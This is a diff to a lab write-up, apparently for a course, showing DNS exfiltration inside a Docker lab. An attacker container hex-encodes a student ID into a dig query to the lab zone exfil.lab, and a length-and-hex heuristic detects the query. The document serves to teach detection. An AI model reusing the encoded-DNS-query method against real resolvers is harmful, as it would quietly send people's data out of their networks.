@@ -8,31 +8,31 @@ log with a simple heuristic script.
 
 | Parameter | Value |
 |---|---|
-| Compose project | `k10` |
-| Zone | `k10.exfil.lab` |
+| Compose project | `k9` |
+| Zone | `k9.exfil.lab` |
 | Resolver | `dns` service (`uts-dnsmasq`) |
 | Payload | NIM, hex-encoded |
 
 ## Method
 
 ```bash
-docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml up -d
+docker compose -p k9 -f lab/b4-dns-exfil/docker-compose.yml up -d
 
 # Encode the payload as a hex label
-echo -n 19552011024 | xxd -p
+echo -n 24552011027 | xxd -p
 
 # Send it upstream inside a DNS query
-docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml exec attacker \
-  dig +short <hex>.k10.exfil.lab @dns
+docker compose -p k9 -f lab/b4-dns-exfil/docker-compose.yml exec attacker \
+  dig +short <hex>.k9.exfil.lab @dns
 
 # Capture the resolver log and run the detector
-docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml logs dns > dns-k10.log
-python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k10.log
+docker compose -p k9 -f lab/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
+python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log
 
 # Decode the label back to the original payload
 echo <hex> | xxd -r -p
 
-docker compose -p k10 -f lab/b4-dns-exfil/docker-compose.yml down -v
+docker compose -p k9 -f lab/b4-dns-exfil/docker-compose.yml down -v
 ```
 
 The detector flags any first label that is both **longer than 30 characters**
@@ -46,13 +46,13 @@ if len(label) > 30 and re.fullmatch(r"[0-9a-fA-F]+", label):
 
 ## Result
 
-Diukur di lab ini (kasus k10):
+Diukur di lab ini (kasus k9):
 
 - Query tercatat di log resolver (`exfil.lab: 2`). Detektor mencetak label
-  42 karakter di bawah **"Query mencurigakan"**:
-  `panjang=42  726168617369612d6e696c61692d7574732d6b3130.k10.exfil.lab`.
+  40 karakter di bawah **"Query mencurigakan"**:
+  `panjang=40  726168617369612d6e696c61692d7574732d6b39.k9.exfil.lab`.
 - Decode dengan `xxd -r -p` mengembalikan payload asli
-  (`rahasia-nilai-uts-k10`) — data keluar dari host dan direkonstruksi murni
+  (`rahasia-nilai-uts-k9`) — data keluar dari host dan direkonstruksi murni
   dari DNS.
 - Dua pengukuran penting: label hex dari NIM 11 digit hanya 22 karakter, jadi
   **tidak** melewati ambang detektor (>30) — exfiltration nyata membawa data
